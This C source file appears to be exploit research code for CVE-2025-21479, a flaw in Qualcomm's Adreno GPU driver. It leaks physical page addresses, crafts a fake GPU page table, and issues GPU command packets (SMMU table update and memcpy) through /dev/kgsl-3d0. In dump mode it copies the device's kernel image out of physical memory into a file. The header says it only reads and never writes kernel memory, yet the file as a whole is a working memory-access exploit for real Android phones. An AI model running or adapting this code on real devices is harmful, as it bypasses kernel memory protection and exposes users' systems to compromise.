/* CVE-2025-21479 research: GPU copies from owned pages or the verified kernel
 * Image region into owned pages. It never writes to kernel physical memory. */
#define main unused_cheese_main
#include "../../references/vivo-iqoo-9t/tools/device/cheese_pa.c"
#undef main

#define CP_MEMCPY 0x75
#ifndef KERNEL_BASE
#define KERNEL_BASE 0xa8000000ULL
#endif
#ifndef IMAGE_SIZE
#define IMAGE_SIZE 0x02ab0000ULL
#endif
#ifndef PAGES
#define PAGES 16
#endif
#define PAGE_BYTES 4096
#ifndef DUMP_PATH
#define DUMP_PATH "/data/local/tmp/p60_kernel_image.bin"
#endif
#ifndef REQUIRE_IMAGE_MAGIC
#define REQUIRE_IMAGE_MAGIC 1
#endif

int main(int argc, char **argv) {
    g_level1_dcache_size = tu_get_l1_dcache_size();
    bool dump = argc == 2;
    uint64_t offset = dump ? strtoull(argv[1], NULL, 0) : 0;
    uint64_t source_base = getenv("P60_SOURCE_PA") ?
        strtoull(getenv("P60_SOURCE_PA"), NULL, 0) : KERNEL_BASE;
    if (dump && (offset >= IMAGE_SIZE || offset % PAGE_BYTES)) return 1;
    size_t length = PAGES * PAGE_BYTES;
    if (dump && offset + length > IMAGE_SIZE) length = IMAGE_SIZE - offset;
    size_t pages = length / PAGE_BYTES;
    if (pages == 0 || 3 + 2 * pages >= 512) return 2;

    unsigned char *source = dump ? NULL : mmap(NULL, length,
        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *output = mmap(NULL, length, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *table = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    uint32_t *payload = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ((!dump && source == MAP_FAILED) || output == MAP_FAILED ||
        table == MAP_FAILED || payload == MAP_FAILED) return 3;
    if (!dump) mlock(source, length);
    mlock(output, length);
    mlock(table, PAGE_BYTES);
    table[0] = 1;
    uint64_t table_pa = leak_phys_page(table);
    if (!table_pa) return 4;

    uint64_t sources[PAGES], outputs[PAGES];
    for (size_t i = 0; i < pages; ++i) {
        output[i * PAGE_BYTES] = 1;
        outputs[i] = leak_phys_page(output + i * PAGE_BYTES);
        if (!dump) {
            source[i * PAGE_BYTES] = 1;
            sources[i] = leak_phys_page(source + i * PAGE_BYTES);
        } else {
            sources[i] = source_base + offset + i * PAGE_BYTES;
        }
        if (!outputs[i] || !sources[i]) return 5;
    }
    if (!dump) {
        for (size_t i = 0; i < length; ++i)
            source[i] = (unsigned char)(i * 37 + 11);
        sync_cache_to_gpu(source, source + length);
    }
    memset(output, 0, length);
    sync_cache_to_gpu(output, output + length);

    memset(table, 0, PAGE_BYTES);
    uint64_t attr = ENTRY_VALID | ENTRY_RW | ENTRY_MEMTYPE_NNC |
                    ENTRY_OUTER_SHARE | ENTRY_AF | ENTRY_NG;
    uint64_t *pte = (uint64_t *)table;
    pte[1] = table_pa | ENTRY_VALID;
    pte[2] = table_pa | ENTRY_VALID;
    for (size_t i = 0; i < pages; ++i) {
        pte[3 + i] = sources[i] | attr;
        pte[3 + pages + i] = outputs[i] | attr;
    }
    pte[3 + 2 * pages] = table_pa | attr;
    sync_cache_to_gpu(table, table + PAGE_BYTES);

    int fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return 6;
    uint32_t context;
    if (kgsl_ctx_create0(fd, &context)) return 7;
    uint64_t payload_va;
    if (kgsl_map(fd, (unsigned long)payload, PAGE_BYTES, &payload_va)) return 8;
    uint32_t *draw = payload + 0x100;
    uint32_t *p = draw;
    *p++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    p += cp_gpuaddr(p, table_pa);
    *p++ = 0;
    *p++ = 0;
    p += cp_wait_for_me(p);
    p += cp_wait_for_idle(p);
    *p++ = cp_type7_packet(CP_MEMCPY, 5);
    *p++ = length / 4;
    p += cp_gpuaddr(p, kFakeGpuAddr);
    p += cp_gpuaddr(p, kFakeGpuAddr + length);
    *p++ = cp_type7_packet(CP_MEM_WRITE, 3);
    p += cp_gpuaddr(p, kFakeGpuAddr + 2 * length + 0x100);
    *p++ = 0x13579bdf;

    uint32_t *q = payload;
    *q++ = cp_type7_packet(CP_SET_MODE, 1);
    *q++ = 1;
    *q++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    *q++ = (p - draw) | ((DRAW_STATE_MODE_BINNING |
            DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    q += cp_gpuaddr(q, payload_va + 0x100 * sizeof(uint32_t));
    sync_cache_to_gpu(payload, (char *)payload + PAGE_BYTES);
    int submit = kgsl_gpu_command_payload(fd, context, 0, 0, 1, 0,
                                          payload_va, (q - payload) * 4);
    bool complete = false;
    for (int i = 0; i < 500; ++i) {
        sync_cache_from_gpu(table + 0x100, table + 0x104);
        if (*(volatile uint32_t *)(table + 0x100) == 0x13579bdf) {
            complete = true;
            break;
        }
        usleep(10000);
    }
    sync_cache_from_gpu(output, output + length);
    int valid = !dump ? memcmp(source, output, length) == 0 :
        !REQUIRE_IMAGE_MAGIC || offset != 0 ||
        *(uint32_t *)(output + 0x38) == 0x644d5241;
    if (!submit && complete && valid && dump) {
        int out = open(DUMP_PATH, O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
        if (out < 0 || pwrite(out, output, length, offset) != length) valid = 0;
        if (out >= 0) close(out);
    }
    printf("offset=0x%llx length=0x%zx submit=%d complete=%d valid=%d\n",
           (unsigned long long)offset, length, submit, complete, valid);
    kgsl_ctx_destroy(fd, context);
    close(fd);
    return submit || !complete || !valid;
}
